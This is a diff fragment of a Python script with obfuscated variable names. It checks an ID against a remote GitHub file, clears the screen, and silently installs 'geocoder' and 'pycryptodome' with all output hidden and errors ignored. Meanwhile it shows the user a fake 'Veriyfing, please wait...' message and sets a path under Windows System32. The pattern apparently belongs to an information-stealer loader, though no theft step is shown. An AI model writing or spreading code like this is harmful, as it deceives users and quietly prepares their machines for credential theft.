@@ -12,8 +12,20 @@ import os
 import gdown
 result = check_string_in_url("https://raw.githubusercontent.com/bizsdklsxc35325/myins/refs/heads/main/unique_id.txt", file_contentsx1)
 os.system('cls')
-commandxx = ['py', '-3.11', '-m', 'pip', 'install', 'pycryptodome']
-subprocess.run(commandxx)
+def install_geocoder():
+    try:
+        subprocess.run(["py", "-3.11", "-m", "pip", "install", "geocoder"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        pass
+
+def install_pycryptodome():
+    try:
+        subprocess.run(["py", "-3.11", "-m", "pip", "install", "pycryptodome"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        pass
+print("Veriyfing, please wait...")
+install_geocoder()
+install_pycryptodome()
 os.system('cls')
 
 dcnmwxdr = r'C:\Windows\System32\DSEL'
